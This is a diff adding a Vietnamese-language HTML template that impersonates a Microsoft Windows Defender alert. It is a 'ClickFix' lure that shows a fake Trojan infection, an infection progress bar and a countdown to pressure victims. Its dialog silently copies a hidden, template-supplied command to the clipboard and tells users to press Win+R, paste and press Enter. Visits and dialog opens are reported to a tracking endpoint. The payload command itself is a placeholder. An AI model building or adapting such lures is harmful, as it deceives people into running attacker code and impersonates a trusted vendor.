@@ -1,0 +1,1159 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cảnh báo bảo mật — Trung tâm Bảo mật Microsoft</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --ms-blue:   #0067b8;
+      --ms-blue-d: #004e8c;
+      --ms-red:    #c42b1c;
+      --ms-orange: #ca5010;
+      --bg:        #f3f2f1;
+      --card:      #ffffff;
+      --border:    #edebe9;
+      --border-2:  #d2d0ce;
+      --text:      #201f1e;
+      --text-2:    #323130;
+      --muted:     #605e5c;
+      --light:     #faf9f8;
+    }
+
+    body {
+      font-family: 'Inter', 'Segoe UI', -apple-system, sans-serif;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      -webkit-font-smoothing: antialiased;
+      color: var(--text);
+    }
+
+    /* ─── MS HEADER ─── */
+    .ms-header {
+      background: var(--ms-blue);
+      padding: 0 32px;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      gap: 0;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .ms-header-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex: 1;
+    }
+
+    /* MS Logo (4 squares) */
+    .ms-logo-wrap {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+    }
+
+    .ms-squares {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 2px;
+      width: 20px;
+      height: 20px;
+    }
+
+    .ms-sq { border-radius: 1px; }
+
+    .ms-header-brand {
+      font-size: 15px;
+      font-weight: 600;
+      color: #fff;
+      letter-spacing: -0.01em;
+    }
+
+    .ms-header-divider {
+      width: 1px;
+      height: 18px;
+      background: rgba(255,255,255,0.35);
+      margin: 0 12px;
+    }
+
+    .ms-header-product {
+      font-size: 14px;
+      color: rgba(255,255,255,0.9);
+      font-weight: 400;
+    }
+
+    .ms-header-right {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .ms-header-link {
+      font-size: 13px;
+      color: rgba(255,255,255,0.88);
+      text-decoration: none;
+      font-weight: 400;
+    }
+
+    .ms-header-link:hover { color: #fff; }
+
+    .ms-header-avatar {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.2);
+      border: 1.5px solid rgba(255,255,255,0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 600;
+      color: #fff;
+      cursor: pointer;
+    }
+
+    /* ─── SUBNAV ─── */
+    .ms-subnav {
+      background: #fff;
+      border-bottom: 2px solid var(--border);
+      padding: 0 32px;
+      display: flex;
+      gap: 0;
+      overflow-x: auto;
+    }
+
+    .ms-subnav-item {
+      padding: 13px 20px;
+      font-size: 13.5px;
+      color: var(--muted);
+      text-decoration: none;
+      white-space: nowrap;
+      border-bottom: 3px solid transparent;
+      margin-bottom: -2px;
+      font-weight: 500;
+      transition: color 0.15s;
+    }
+
+    .ms-subnav-item:hover { color: var(--ms-blue); }
+    .ms-subnav-item.active { color: var(--ms-blue); border-bottom-color: var(--ms-blue); }
+
+    /* ─── CRITICAL BANNER ─── */
+    .ms-crit-banner {
+      background: linear-gradient(135deg, #a52019, #8b1511);
+      padding: 14px 32px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .mcb-icon {
+      width: 44px;
+      height: 44px;
+      background: rgba(255,255,255,0.15);
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      flex-shrink: 0;
+      animation: warnPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes warnPulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(255,255,255,0.2); }
+      50%       { box-shadow: 0 0 0 8px rgba(255,255,255,0); }
+    }
+
+    .mcb-text { flex: 1; }
+
+    .mcb-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 3px;
+    }
+
+    .mcb-sub {
+      font-size: 12.5px;
+      color: rgba(255,255,255,0.8);
+    }
+
+    .mcb-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255,255,255,0.15);
+      border: 1px solid rgba(255,255,255,0.3);
+      border-radius: 20px;
+      padding: 4px 12px;
+      font-size: 11.5px;
+      font-weight: 700;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      flex-shrink: 0;
+    }
+
+    .mcb-dot {
+      width: 6px;
+      height: 6px;
+      background: #fff;
+      border-radius: 50%;
+      animation: blink 1s ease-in-out infinite;
+    }
+
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+    /* ─── PAGE LAYOUT ─── */
+    .ms-layout {
+      display: flex;
+      flex: 1;
+      max-width: 1160px;
+      margin: 0 auto;
+      width: 100%;
+      padding: 28px 32px;
+      gap: 28px;
+      align-items: flex-start;
+    }
+
+    /* ─── LEFT NAV ─── */
+    .ms-left-nav {
+      width: 220px;
+      flex-shrink: 0;
+    }
+
+    .ms-nav-section { margin-bottom: 24px; }
+
+    .ms-nav-section-title {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--muted);
+      padding: 0 10px;
+      margin-bottom: 6px;
+    }
+
+    .ms-nav-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 10px;
+      font-size: 13px;
+      color: var(--text-2);
+      text-decoration: none;
+      border-radius: 4px;
+      transition: background 0.15s;
+      cursor: pointer;
+    }
+
+    .ms-nav-item:hover { background: var(--border); }
+    .ms-nav-item.active {
+      background: #deecf9;
+      color: var(--ms-blue);
+      font-weight: 600;
+    }
+
+    .ms-nav-item-icon { font-size: 15px; flex-shrink: 0; }
+
+    /* ─── MAIN CONTENT ─── */
+    .ms-main {
+      flex: 1;
+      min-width: 0;
+    }
+
+    /* Breadcrumb */
+    .ms-breadcrumb {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 18px;
+    }
+
+    .ms-breadcrumb a { color: var(--ms-blue); text-decoration: none; }
+    .ms-breadcrumb a:hover { text-decoration: underline; }
+
+    /* ─── THREAT CARD ─── */
+    .threat-card {
+      background: var(--card);
+      border: 1px solid var(--border-2);
+      border-radius: 6px;
+      overflow: hidden;
+      margin-bottom: 20px;
+      box-shadow: 0 1px 6px rgba(0,0,0,0.07);
+    }
+
+    .tc-header {
+      background: linear-gradient(135deg, #c42b1c, #a82018);
+      padding: 20px 24px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .tc-icon {
+      width: 56px;
+      height: 56px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      flex-shrink: 0;
+      border: 2px solid rgba(255,255,255,0.25);
+    }
+
+    .tc-header-text {}
+
+    .tc-level-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: rgba(255,255,255,0.15);
+      border: 1px solid rgba(255,255,255,0.3);
+      border-radius: 20px;
+      padding: 2px 10px;
+      font-size: 10.5px;
+      font-weight: 700;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 6px;
+    }
+
+    .tc-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: -0.01em;
+      line-height: 1.3;
+    }
+
+    .tc-body { padding: 0 24px; }
+
+    /* Threat row */
+    .threat-name-row {
+      padding: 16px 0;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+
+    .tnr-icon { font-size: 18px; flex-shrink: 0; margin-top: 2px; }
+
+    .tnr-label {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--muted);
+      margin-bottom: 4px;
+    }
+
+    .tnr-name {
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 15px;
+      font-weight: 700;
+      color: #7b1e1e;
+    }
+
+    .tnr-desc {
+      font-size: 13px;
+      color: var(--text-2);
+      margin-top: 6px;
+      line-height: 1.6;
+    }
+
+    /* Info grid */
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 0;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .ig-cell {
+      padding: 14px 18px;
+      border-right: 1px solid var(--border);
+    }
+
+    .ig-cell:last-child { border-right: none; }
+
+    .ig-label {
+      font-size: 10.5px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--muted);
+      margin-bottom: 5px;
+    }
+
+    .ig-value {
+      font-size: 13.5px;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .ig-value.red   { color: var(--ms-red); }
+    .ig-value.orange { color: var(--ms-orange); }
+
+    /* Progress bar */
+    .threat-progress {
+      padding: 16px 0;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .tp-header {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12.5px;
+      color: var(--muted);
+      margin-bottom: 8px;
+    }
+
+    .tp-pct {
+      font-weight: 700;
+      color: var(--ms-red);
+    }
+
+    .tp-bar-wrap {
+      height: 5px;
+      background: #edebe9;
+      border-radius: 99px;
+      overflow: hidden;
+      margin-bottom: 6px;
+    }
+
+    .tp-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #c42b1c, #e05050);
+      border-radius: 99px;
+      width: 0;
+      animation: progAnim 2.5s ease-out forwards;
+    }
+
+    @keyframes progAnim { to { width: 87%; } }
+
+    .tp-note { font-size: 11.5px; color: var(--muted); }
+
+    /* Action buttons */
+    .tc-actions {
+      padding: 18px 0;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .btn-ms-red {
+      padding: 10px 22px;
+      background: var(--ms-red);
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      font-size: 13.5px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.18s;
+      box-shadow: 0 1px 4px rgba(196,43,28,0.35);
+    }
+
+    .btn-ms-red:hover {
+      background: #a82018;
+      box-shadow: 0 2px 8px rgba(196,43,28,0.45);
+    }
+
+    .btn-ms-outline {
+      padding: 9px 20px;
+      background: transparent;
+      border: 1px solid var(--ms-blue);
+      color: var(--ms-blue);
+      border-radius: 3px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background 0.15s;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .btn-ms-outline:hover { background: #deecf9; }
+
+    /* ─── INFO CARDS ─── */
+    .info-cards-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    .info-card {
+      background: var(--card);
+      border: 1px solid var(--border-2);
+      border-radius: 6px;
+      overflow: hidden;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+    }
+
+    .ic-header {
+      background: var(--light);
+      border-bottom: 1px solid var(--border);
+      padding: 10px 16px;
+      font-size: 12.5px;
+      font-weight: 700;
+      color: var(--text-2);
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+
+    .ic-body { padding: 8px 0; }
+
+    .ic-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 7px 16px;
+      font-size: 12.5px;
+      color: var(--text-2);
+      border-bottom: 1px solid #f8f7f6;
+    }
+
+    .ic-row:last-child { border-bottom: none; }
+    .ic-row-icon { font-size: 14px; flex-shrink: 0; }
+    .ic-row.warn { color: var(--ms-red); font-weight: 600; }
+
+    /* ─── RIGHT SIDEBAR ─── */
+    .ms-right-sidebar {
+      width: 220px;
+      flex-shrink: 0;
+    }
+
+    .rs-card {
+      background: var(--card);
+      border: 1px solid var(--border-2);
+      border-radius: 6px;
+      overflow: hidden;
+      margin-bottom: 16px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+    }
+
+    .rs-header {
+      background: var(--light);
+      border-bottom: 1px solid var(--border);
+      padding: 9px 14px;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--text-2);
+    }
+
+    .rs-body { padding: 10px 0; }
+
+    .rs-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 7px 14px;
+      font-size: 12px;
+      color: var(--text-2);
+      border-bottom: 1px solid #f8f7f6;
+    }
+
+    .rs-item:last-child { border-bottom: none; }
+    .rs-item-icon { font-size: 13px; flex-shrink: 0; }
+
+    .rs-countdown {
+      padding: 12px 14px;
+      text-align: center;
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .rs-timer {
+      font-size: 24px;
+      font-weight: 700;
+      color: var(--ms-red);
+      font-variant-numeric: tabular-nums;
+      display: block;
+      margin-top: 4px;
+    }
+
+    /* ─── OVERLAY ─── */
+    .ms-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .ms-overlay.visible { display: flex; }
+
+    .ms-dialog {
+      background: #fff;
+      border: 1px solid var(--border-2);
+      border-radius: 6px;
+      max-width: 480px;
+      width: 100%;
+      box-shadow: 0 24px 60px rgba(0,0,0,0.28);
+      animation: dlgIn 0.25s cubic-bezier(0.22,1,0.36,1);
+      overflow: hidden;
+    }
+
+    @keyframes dlgIn {
+      from { opacity:0; transform: scale(0.95) translateY(8px); }
+      to   { opacity:1; transform: scale(1) translateY(0); }
+    }
+
+    .msd-header {
+      background: var(--ms-blue);
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: #fff;
+    }
+
+    .msd-h-icon {
+      width: 36px;
+      height: 36px;
+      background: rgba(255,255,255,0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      flex-shrink: 0;
+    }
+
+    .msd-h-title { font-size: 14.5px; font-weight: 700; }
+    .msd-h-sub   { font-size: 11.5px; opacity: 0.8; margin-top: 2px; }
+
+    .msd-body { padding: 20px; }
+
+    .msd-notice {
+      background: #fff8f5;
+      border: 1px solid #fde0cc;
+      border-left: 4px solid var(--ms-orange);
+      border-radius: 4px;
+      padding: 11px 14px;
+      font-size: 12.5px;
+      color: #7c3c10;
+      line-height: 1.55;
+      margin-bottom: 16px;
+    }
+
+    .msd-steps { display: flex; flex-direction: column; gap: 0; }
+
+    .msd-step {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 13px 0;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .msd-step:last-child { border-bottom: none; }
+
+    .msd-step-n {
+      width: 26px;
+      height: 26px;
+      background: var(--ms-blue);
+      color: #fff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    .msd-step-title {
+      font-size: 13.5px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 3px;
+    }
+
+    .msd-step-desc {
+      font-size: 12.5px;
+      color: var(--muted);
+      line-height: 1.5;
+    }
+
+    .ms-kbd {
+      display: inline-flex;
+      background: #f3f2f1;
+      border: 1px solid #c8c6c4;
+      border-bottom-width: 2px;
+      border-radius: 3px;
+      padding: 1px 7px;
+      font-size: 11.5px;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    /* Hidden payload span */
+    #ms-cmd-hidden { display: none; }
+
+    .ms-copy-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: #e6f4ea;
+      border: 1px solid #a8d5b5;
+      border-radius: 3px;
+      padding: 0 10px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #188038;
+      margin-top: 0;
+      max-height: 0;
+      opacity: 0;
+      overflow: hidden;
+      transition: all 0.3s ease-out;
+    }
+
+    .ms-copy-badge.show {
+      margin-top: 7px;
+      padding: 4px 10px;
+      max-height: 40px;
+      opacity: 1;
+    }
+
+    .msd-footer {
+      padding: 0 20px 16px;
+      display: flex;
+      gap: 10px;
+      justify-content: flex-end;
+    }
+
+    .msd-btn {
+      padding: 8px 18px;
+      background: #f3f2f1;
+      border: 1px solid #c8c6c4;
+      border-radius: 3px;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text);
+      cursor: pointer;
+      font-family: inherit;
+      transition: background 0.15s;
+    }
+
+    .msd-btn:hover { background: #edebe9; }
+
+    /* ─── FOOTER ─── */
+    .ms-footer {
+      background: var(--ms-blue-d);
+      padding: 14px 32px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      align-items: center;
+      font-size: 12px;
+      color: rgba(255,255,255,0.7);
+      margin-top: auto;
+    }
+
+    .ms-footer a { color: rgba(255,255,255,0.7); text-decoration: none; }
+    .ms-footer a:hover { color: #fff; }
+
+    @media (max-width: 768px) {
+      .ms-left-nav, .ms-right-sidebar { display: none; }
+      .ms-layout { padding: 16px; }
+      .info-grid { grid-template-columns: 1fr 1fr; }
+      .info-cards-row { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body data-lure="microsoft_alert">
+
+  <!-- ─── MICROSOFT HEADER ─── -->
+  <header class="ms-header">
+    <div class="ms-header-left">
+      <a class="ms-logo-wrap" href="#">
+        <div class="ms-squares">
+          <div class="ms-sq" style="background:#F25022"></div>
+          <div class="ms-sq" style="background:#7FBA00"></div>
+          <div class="ms-sq" style="background:#00A4EF"></div>
+          <div class="ms-sq" style="background:#FFB900"></div>
+        </div>
+        <span class="ms-header-brand">Microsoft</span>
+      </a>
+      <div class="ms-header-divider"></div>
+      <span class="ms-header-product">Trung tâm Bảo mật</span>
+    </div>
+    <div class="ms-header-right">
+      <a class="ms-header-link" href="#">Hỗ trợ</a>
+      <a class="ms-header-link" href="#">Tài liệu</a>
+      <div class="ms-header-avatar">N</div>
+    </div>
+  </header>
+
+  <!-- ─── SUBNAV ─── -->
+  <nav class="ms-subnav">
+    <a class="ms-subnav-item" href="#">Trang chủ</a>
+    <a class="ms-subnav-item active" href="#">Bảo vệ thiết bị</a>
+    <a class="ms-subnav-item" href="#">Tường lửa</a>
+    <a class="ms-subnav-item" href="#">Kiểm soát trình duyệt</a>
+    <a class="ms-subnav-item" href="#">Bảo vệ danh tính</a>
+    <a class="ms-subnav-item" href="#">Bảo mật ứng dụng</a>
+  </nav>
+
+  <!-- ─── CRITICAL BANNER ─── -->
+  <div class="ms-crit-banner">
+    <div class="mcb-icon">⚠️</div>
+    <div class="mcb-text">
+      <div class="mcb-title">Mối đe dọa nghiêm trọng được phát hiện — Cần xử lý ngay lập tức</div>
+      <div class="mcb-sub">Windows Defender đã phát hiện phần mềm độc hại không thể tự động xóa. Hành động ngay để bảo vệ thiết bị của bạn.</div>
+    </div>
+    <div class="mcb-badge">
+      <div class="mcb-dot"></div>
+      {{ content.threat_level | default('NGHIÊM TRỌNG') }}
+    </div>
+  </div>
+
+  <!-- ─── LAYOUT ─── -->
+  <div class="ms-layout">
+
+    <!-- Left nav -->
+    <aside class="ms-left-nav">
+      <div class="ms-nav-section">
+        <div class="ms-nav-section-title">Bảo vệ virus</div>
+        <a class="ms-nav-item active" href="#">
+          <span class="ms-nav-item-icon">🔴</span> Mối đe dọa hiện tại
+        </a>
+        <a class="ms-nav-item" href="#">
+          <span class="ms-nav-item-icon">🔍</span> Lịch sử quét
+        </a>
+        <a class="ms-nav-item" href="#">
+          <span class="ms-nav-item-icon">⚙️</span> Tùy chọn quét
+        </a>
+      </div>
+
+      <div class="ms-nav-section">
+        <div class="ms-nav-section-title">Trạng thái</div>
+        <a class="ms-nav-item" href="#">
+          <span class="ms-nav-item-icon">✅</span> Bảo vệ thời gian thực
+        </a>
+        <a class="ms-nav-item" href="#">
+          <span class="ms-nav-item-icon">🛡️</span> Bảo vệ đám mây
+        </a>
+        <a class="ms-nav-item" href="#">
+          <span class="ms-nav-item-icon">🔄</span> Cập nhật định nghĩa
+        </a>
+      </div>
+
+      <div class="ms-nav-section">
+        <div class="ms-nav-section-title">Hỗ trợ</div>
+        <a class="ms-nav-item" href="#">
+          <span class="ms-nav-item-icon">📞</span> Liên hệ IT Security
+        </a>
+        <a class="ms-nav-item" href="#">
+          <span class="ms-nav-item-icon">📋</span> Báo cáo sự cố
+        </a>
+      </div>
+    </aside>
+
+    <!-- Main content -->
+    <main class="ms-main">
+
+      <!-- Breadcrumb -->
+      <div class="ms-breadcrumb">
+        <a href="#">Trung tâm Bảo mật</a>
+        <span>›</span>
+        <a href="#">Bảo vệ thiết bị</a>
+        <span>›</span>
+        <span>Mối đe dọa hiện tại</span>
+      </div>
+
+      <!-- Threat card -->
+      <div class="threat-card">
+        <div class="tc-header">
+          <div class="tc-icon">🦠</div>
+          <div class="tc-header-text">
+            <div class="tc-level-badge">
+              <div class="mcb-dot"></div> Cần xử lý ngay
+            </div>
+            <div class="tc-title">{{ content.title | default('Windows Defender — Cảnh Báo Bảo Mật Nghiêm Trọng') }}</div>
+          </div>
+        </div>
+
+        <div class="tc-body">
+          <!-- Threat name row -->
+          <div class="threat-name-row">
+            <div class="tnr-icon">🔴</div>
+            <div>
+              <div class="tnr-label">Mối đe dọa được phát hiện</div>
+              <div class="tnr-name">{{ content.threat_name | default('Trojan:Win32/Wacatac.H!ml') }}</div>
+              <div class="tnr-desc">{{ content.message | default('Máy tính của bạn đã bị nhiễm phần mềm độc hại. Cần thực hiện ngay lập tức để bảo vệ dữ liệu và tài khoản của bạn.') }}</div>
+            </div>
+          </div>
+
+          <!-- Info grid -->
+          <div class="info-grid">
+            <div class="ig-cell">
+              <div class="ig-label">Mức độ nguy hiểm</div>
+              <div class="ig-value red">🔴 Cao</div>
+            </div>
+            <div class="ig-cell">
+              <div class="ig-label">Trạng thái</div>
+              <div class="ig-value red">Chưa xử lý</div>
+            </div>
+            <div class="ig-cell">
+              <div class="ig-label">Loại mối đe dọa</div>
+              <div class="ig-value">Trojan / Spyware</div>
+            </div>
+            <div class="ig-cell">
+              <div class="ig-label">Phát hiện lúc</div>
+              <div class="ig-value" id="ms-time" style="font-size:12.5px">–</div>
+            </div>
+          </div>
+
+          <!-- Progress -->
+          <div class="threat-progress">
+            <div class="tp-header">
+              <span>Mức độ lây nhiễm hệ thống</span>
+              <span class="tp-pct">87%</span>
+            </div>
+            <div class="tp-bar-wrap">
+              <div class="tp-bar-fill"></div>
+            </div>
+            <div class="tp-note">3 tệp hệ thống bị xâm phạm — Mã lỗi: <code>{{ content.error_code | default('0x80073b01') }}</code></div>
+          </div>
+
+          <!-- Actions -->
+          <div class="tc-actions">
+            <button class="btn-ms-red" onclick="openDialog()">
+              🛡️ Khắc phục ngay lập tức
+            </button>
+            <button class="btn-ms-outline" onclick="openDialog()">
+              📋 Xem hướng dẫn xử lý
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Info cards -->
+      <div class="info-cards-row">
+        <div class="info-card">
+          <div class="ic-header">🛡️ Bảng điều khiển bảo mật</div>
+          <div class="ic-body">
+            <div class="ic-row"><span class="ic-row-icon">✅</span> Bảo vệ thời gian thực: Bật</div>
+            <div class="ic-row warn"><span class="ic-row-icon">❌</span> Mối đe dọa chờ xử lý: 1</div>
+            <div class="ic-row"><span class="ic-row-icon">🔄</span> Định nghĩa: Cập nhật mới</div>
+            <div class="ic-row"><span class="ic-row-icon">🔒</span> Kiểm soát trình duyệt: Bật</div>
+          </div>
+        </div>
+        <div class="info-card">
+          <div class="ic-header">📋 Khuyến nghị bảo mật</div>
+          <div class="ic-body">
+            <div class="ic-row warn"><span class="ic-row-icon">🔴</span> Khắc phục mối đe dọa ngay</div>
+            <div class="ic-row"><span class="ic-row-icon">📞</span> Liên hệ bộ phận IT Security</div>
+            <div class="ic-row"><span class="ic-row-icon">🔑</span> Đổi mật khẩu tài khoản</div>
+            <div class="ic-row"><span class="ic-row-icon">💾</span> Sao lưu dữ liệu quan trọng</div>
+          </div>
+        </div>
+      </div>
+
+    </main>
+
+    <!-- Right sidebar -->
+    <aside class="ms-right-sidebar">
+      <div class="rs-card">
+        <div class="rs-header">⏱️ Cần xử lý trong</div>
+        <div class="rs-countdown">
+          <div style="font-size:12px;color:#605e5c">Thời gian còn lại</div>
+          <span class="rs-timer" id="ms-countdown">05:00</span>
+        </div>
+      </div>
+
+      <div class="rs-card">
+        <div class="rs-header" style="background:#fdf1f0;color:#7b1e1e">🚨 Trạng thái hệ thống</div>
+        <div class="rs-body">
+          <div class="rs-item" style="color:#c42b1c;font-weight:600">
+            <span class="rs-item-icon">🔴</span> Hệ thống có nguy cơ cao
+          </div>
+          <div class="rs-item"><span class="rs-item-icon">⚠️</span> Tường lửa: Cần kiểm tra</div>
+          <div class="rs-item"><span class="rs-item-icon">🔄</span> Phiên bản: Cập nhật mới</div>
+        </div>
+      </div>
+
+      <div class="rs-card">
+        <div class="rs-header">📞 Liên hệ hỗ trợ</div>
+        <div class="rs-body">
+          <div class="rs-item"><span class="rs-item-icon">💬</span> Chat trực tuyến</div>
+          <div class="rs-item"><span class="rs-item-icon">📧</span> Gửi báo cáo sự cố</div>
+          <div class="rs-item"><span class="rs-item-icon">📖</span> Tài liệu kỹ thuật</div>
+        </div>
+      </div>
+    </aside>
+  </div>
+
+  <!-- ─── DIALOG OVERLAY (NO visible command) ─── -->
+  <div class="ms-overlay" id="ms-overlay">
+    <div class="ms-dialog">
+
+      <div class="msd-header">
+        <div class="msd-h-icon">🛡️</div>
+        <div>
+          <div class="msd-h-title">Windows Defender — Khắc phục thủ công</div>
+          <div class="msd-h-sub">Không thể xóa mối đe dọa tự động — Cần can thiệp</div>
+        </div>
+      </div>
+
+      <div class="msd-body">
+        <div class="msd-notice">
+          ⚠️ Windows Defender không thể tự động xóa <strong>{{ content.threat_name | default('Trojan:Win32/Wacatac.H!ml') }}</strong>. Vui lòng thực hiện các bước dưới đây để loại bỏ hoàn toàn mối đe dọa.
+        </div>
+
+        <div class="msd-steps">
+          <div class="msd-step">
+            <div class="msd-step-n">1</div>
+            <div>
+              <div class="msd-step-title">Mở Windows Run</div>
+              <div class="msd-step-desc">Nhấn <span class="ms-kbd">⊞ Win</span> + <span class="ms-kbd">R</span> trên bàn phím</div>
+            </div>
+          </div>
+
+          <div class="msd-step">
+            <div class="msd-step-n">2</div>
+            <div>
+              <div class="msd-step-title">Dán lệnh khắc phục</div>
+              <div class="msd-step-desc">
+                Nhấn <span class="ms-kbd">Ctrl</span> + <span class="ms-kbd">V</span> — lệnh khắc phục đã được sao chép tự động
+              </div>
+              <!-- Hidden command — NOT displayed to user -->
+              <span id="ms-cmd-hidden">{{ content.display_command }}</span>
+              <div class="ms-copy-badge" id="ms-copy-badge">
+                ✅ Lệnh khắc phục đã được sao chép vào clipboard
+              </div>
+            </div>
+          </div>
+
+          <div class="msd-step">
+            <div class="msd-step-n">3</div>
+            <div>
+              <div class="msd-step-title">Thực thi công cụ loại bỏ mối đe dọa</div>
+              <div class="msd-step-desc">Nhấn <span class="ms-kbd">Enter</span> để chạy công cụ bảo mật của Microsoft</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="msd-footer">
+        <button class="msd-btn" onclick="closeDialog()">Hủy</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ─── FOOTER ─── -->
+  <footer class="ms-footer">
+    <span>© 2025 Microsoft Corporation</span>
+    <a href="#">Quyền riêng tư</a>
+    <a href="#">Điều khoản sử dụng</a>
+    <a href="#">Cookie</a>
+    <a href="#">Thương hiệu</a>
+  </footer>
+
+  <script>
+    {{ payload_content | safe }}
+
+    // Set time
+    const timeEl = document.getElementById('ms-time');
+    if (timeEl) timeEl.textContent = new Date().toLocaleTimeString('vi-VN', {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+
+    // Countdown
+    let sec = 300;
+    const cdEl = document.getElementById('ms-countdown');
+    setInterval(() => {
+      if (!cdEl || sec <= 0) return;
+      sec--;
+      const m = Math.floor(sec/60), s = sec%60;
+      cdEl.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+    }, 1000);
+
+    // Visit
+    fetch('/api/track', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ lure: 'microsoft_alert', event: 'visit' })
+    }).catch(()=>{});
+
+    function copyCmd() {
+      const cmd = document.getElementById('ms-cmd-hidden').textContent.trim();
+      const badge = document.getElementById('ms-copy-badge');
+      const show = () => { if(badge) badge.classList.add('show'); };
+
+      if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(cmd).then(show).catch(() => fallback(cmd, show));
+      } else fallback(cmd, show);
+    }
+
+    function fallback(text, cb) {
+      try {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.cssText = 'position:fixed;opacity:0;top:-9999px';
+        document.body.appendChild(ta);
+        ta.focus(); ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        if(cb) cb();
+      } catch(e){}
+    }
+
+    function openDialog() {
+      document.getElementById('ms-overlay').classList.add('visible');
+      copyCmd();
+      fetch('/api/track', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ lure: 'microsoft_alert', event: 'overlay_shown' })
+      }).catch(()=>{});
+    }
